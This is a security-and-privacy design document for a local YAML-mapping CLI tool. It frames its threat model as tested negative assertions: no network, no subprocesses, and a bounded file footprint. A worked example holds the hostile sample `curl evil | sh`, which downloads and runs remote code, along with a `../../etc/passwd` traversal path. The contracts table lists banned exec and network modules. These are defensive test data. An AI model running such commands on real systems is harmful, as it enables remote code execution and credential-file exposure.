---
artifact: product-doc
role: concern
concern-id: security-and-privacy
behavior: baseline
trigger: always
in-scope-subaspects: [trust-boundaries, secrets-credential-handling, threat-model]
current-rung: contract-grade
status: draft
version: 1.1.0
---

# Security & Privacy — dictum-binder

> One-line: a minimal-risk local tool whose entire security surface is eight negative and hygiene assertions — no network, no execution, a bounded file footprint, no ambient configuration, fail-closed parsing with a lift-able size cap, symlinks resolved to their final target, no secrets, one trust boundary — each a forced contract test.

## Purpose & Scope

Owns the trust boundary, the (empty) secrets posture, and the threat model, which for this product is where "not a threat here" becomes a contractual negative assertion (spec: minimal-risk products invert the threat model's job). Every assertion is realised by the Architecture patterns it names and proven by a contract test in Quality.

## Non-goals / Out-of-scope

- `authentication-mechanism` — `absent`: no users beyond the invoking local account.
- `authorization` — `absent`: no roles, no protected resources, no event surface; no `ROLE-*` exists and no per-interface authz table is owed.
- `encryption` — `absent`: no sensitive data at rest; no transit at all.
- `session-management` — `absent`: no sessions.
- `data-protection-mechanisms-per-sensitive-field` — `absent`: no sensitive fields (Domain scoped classification tags out as absent; Governance has no data-handling policy).
- No sandboxing or privilege dropping: the tool runs with the caller's privileges by design. `absent`.
- No hardening against a hostile *local* user who owns the working directory: they already own the file. `absent` by trait fact.
- No nesting-depth cap distinct from the schema's fixed depth (see `SEC-FAIL-CLOSED`). `absent` by design.

## Requirements

### Trust boundaries

One boundary: the **process boundary** between `lspd` and its caller (`PERSONA-AGENT`'s shell or `PERSONA-HUMAN`). Everything inside runs with the caller's user, umask, and filesystem permissions; nothing is elevated, dropped, or delegated. Inputs crossing the boundary are argv, stdin (only for `set --json -`), and the bytes of the target file. Outputs are stdout, stderr (only under `--debug`), the exit code, and the target file's bytes. No other channel exists (`SEC-TRUST-BOUNDARY`).

### Secrets & credential handling

None are handled, stored, requested, or required. A `run` selector is an opaque string the tool never interprets or executes; a `path` is stat-ed at most, never read. No token, key, or credential can enter the tool because no command accepts one and no network or subprocess exists to use one (`SEC-NO-SECRETS`).

### Threat model

Stated as what is *not* a threat here, and why, each backed by an assertion:

| Threat class | Disposition | Assertion |
|---|---|---|
| Data exfiltration over the network | Impossible: no socket is ever opened | `SEC-ZERO-NETWORK` |
| Command injection through file content (`run` selectors, symbols) | Impossible: nothing is executed | `SEC-ZERO-EXEC` |
| Writing outside the target (path traversal via locators, temp files elsewhere) | Bounded: only the resolved target and its temporary sibling are written; `..` and absolute paths are rejected before any stat | `SEC-FILE-FOOTPRINT` |
| Behaviour altered by environment or dotfiles | Impossible: no ambient configuration is read | `SEC-NO-AMBIENT-CONFIG` |
| Resource exhaustion from pathological input | Bounded: 10 MiB cap unless lifted; schema depth is fixed; parser failure is a structured error | `SEC-FAIL-CLOSED` |
| Symlink tricks on the target | Resolved: the final target is always what is read and replaced | `SEC-SYMLINK-FINAL-TARGET` |
| Secret leakage | Nothing to leak | `SEC-NO-SECRETS` |
| Privilege confusion | One boundary, caller's privileges only | `SEC-TRUST-BOUNDARY` |

## Open Questions

None open.

## Dependencies & Cross-references

- Realised by `PATTERN-ATOMIC-REPLACE`, `PATTERN-ERROR-ENVELOPE`, `PATTERN-EXIT-CODES` (Architecture); `COMPONENT-LOADER` enforces the size cap and symlink resolution; `COMPONENT-EMITTER` the write footprint.
- Surfaces through `ERR-PARSE`, `ERR-IO`, `ERR-FILE-TOO-LARGE` and the global `--no-size-limit` option (Interfaces); `INV-PATH-FORM` (Domain) is the pre-stat guard.
- Proven by contract tests per `SEC-*` (Quality's coverage map gains eight rows).
- Personas `PERSONA-AGENT`, `PERSONA-HUMAN` (Product) are the only subjects; neither maps to a role.

## Examples / Worked scenarios

1. **A malicious map.** A file contains `run: "curl evil | sh"` and a locator path `../../etc/passwd`. `validate` reports `INV-PATH-FORM` for the path and nothing else; the `run` string is returned verbatim in `get` output and never executed; with `--check-paths` the `..` path is never stat-ed because it failed the form check first.
2. **An 11 MiB file.** `lspd validate` → `ERR-FILE-TOO-LARGE`, exit 1, message naming the cap and the flag. `lspd --no-size-limit validate` proceeds.
3. **A symlinked target.** `docs/bindings.yaml` → `../shared/bindings.yaml`. Every command reads the shared file; a write creates the temp file beside the shared file and renames over it; the symlink is untouched.
4. **A traceback attempt.** A crafted YAML that triggers a parser recursion error yields `ERR-PARSE`, exit 2, one JSON document, empty stderr.

## Design Decisions

| Decision | Rationale |
|---|---|
| Whole surface as negative assertions with forced tests | The spec's minimal-risk inversion: a claim that is not tested is implicit, and implicit is what this concern exists to remove |
| 10 MiB cap with a lift flag rather than no cap | Fail-closed by default; the rare legitimate giant map is one flag away instead of blocked |
| Symlinks resolved to the final target | Replacing a link with a file would silently change the repository's structure; the operator chose "deal with the final target all the time" |
| Version ranges, no hash lock | The operator's call (Integrations); the single runtime dependency is MIT with zero transitive dependencies |

## Contracts

Register form: table row, ID in the first cell. Each assertion names its realising mechanism and its forcing test.

| ID | Assertion | Realised by | Forced by |
|---|---|---|---|
| `SEC-ZERO-NETWORK` | No command opens a socket or imports a networking module; the process makes zero network calls | fitness: no `socket`, `http`, `urllib`, `requests`, `ssl` import anywhere in `src/lspd/` | a contract test runs every `CLI-*` under a monkeypatched `socket.socket` that raises, and asserts no raise |
| `SEC-ZERO-EXEC` | No command spawns a subprocess or evaluates code; `run` selectors and all other strings are inert data | fitness: no `subprocess`, `os.system`, `os.exec*`, `eval`, `exec`, `compile` in `src/lspd/` | contract test with `subprocess.Popen` and `os.system` monkeypatched to raise, over every element with a fixture containing shell-like `run` values |
| `SEC-FILE-FOOTPRINT` | Reads: only the resolved target (plus stdin for `set --json -`). Writes: only the resolved target and one temporary file in its directory, removed on failure. With `--check-paths`, locator paths — in the file and in write input — are stat-ed only (`INV-PATH-EXISTS`), after `INV-PATH-FORM` has rejected `..` and absolute forms | `COMPONENT-LOADER`, `COMPONENT-EMITTER`, `PATTERN-ATOMIC-REPLACE`, `INV-PATH-FORM` | a contract test runs every element in a temp dir with an audit hook (`sys.addaudithook`) recording `open`/`os.rename` targets and a monkeypatched `os.stat` recording stat targets (CPython raises no audit event for `stat`) and asserts that, restricted to paths under the test's temporary directory, the set is ⊆ {target, target's temp sibling, listed locator paths under `--check-paths`} — interpreter, site-packages, and package-metadata reads are outside that directory and outside the assertion |
| `SEC-NO-AMBIENT-CONFIG` | No environment variable, dotfile, user config, or working-directory file other than the target influences any behaviour | fitness: no `os.environ`, `os.getenv`, `configparser`, `dotenv`, `pathlib.Path.home` in `src/lspd/` | contract test runs an element twice, once with a cleared environment and hostile dotfiles present, and asserts byte-identical stdout and file |
| `SEC-FAIL-CLOSED` | Any input the Loader cannot turn into a Model — invalid YAML, BOM, CRLF, duplicate key, parser recursion failure, non-UTF-8, a comment with no possible anchor — yields `ERR-PARSE`, exit 2, one JSON document, no traceback. A target larger than **10 MiB (10 485 760 bytes)** yields `ERR-FILE-TOO-LARGE`, exit 1, unless the global `--no-size-limit` option is given; the size check precedes parsing. Nesting depth is bounded by the schema's fixed shape (`INV-CLOSED-KEYS` rejects any deeper structure) and needs no separate cap | `COMPONENT-LOADER` (size check first, then bytes check, then parse), `PATTERN-ERROR-ENVELOPE` | one fixture per malformed class; a generated 10 MiB + 1 byte file with and without the flag; a 10 MiB exact file passes |
| `SEC-SYMLINK-FINAL-TARGET` | When the target path (or any component of it) is a symbolic link, every read and write operates on the fully resolved final target; the temporary file is created in the final target's directory and the rename replaces the final target; no link is ever replaced or removed | `COMPONENT-LOADER` and `COMPONENT-EMITTER` resolve with `os.path.realpath` before any I/O | contract test: a symlink chain to a real file; after a write the chain is intact and the real file holds the new bytes |
| `SEC-NO-SECRETS` | The tool defines no argument, file field, or channel for a credential; nothing is stored beyond the map's own content; nothing in stdout, stderr, or the file is ever redacted because nothing secret can be present | by construction (surface enumerated in Interfaces) | fitness: the argparse surface contains no argument whose name matches `token|key|secret|password|credential`; the schema contains no such key |
| `SEC-TRUST-BOUNDARY` | One boundary: the process boundary to the caller. No privilege change (`setuid`, `os.setuid`, capabilities), no delegation, no daemonising; the temporary file takes the target's permission bits and never widens them; a file created by `init` takes the umask default | fitness: no `os.setuid`/`setgid`/`fork`/`daemon` in `src/lspd/`; `PATTERN-ATOMIC-REPLACE` copies mode bits | contract test: a target with mode `0600`; after a write the file is `0600` |

## Acceptance criteria

1. Each `SEC-*` row's *Forced by* test exists and is green (Quality's coverage map rows, one per assertion).
2. The fitness tests named in *Realised by* run as part of the fitness tier and grep the whole `src/lspd/` tree.
3. `ERR-FILE-TOO-LARGE` and `--no-size-limit` appear in Interfaces' catalog and global options and have their contract tests.
4. The threat-model table has a non-empty *Assertion* cell in every row; a row without one would be an unbacked claim and fails review.

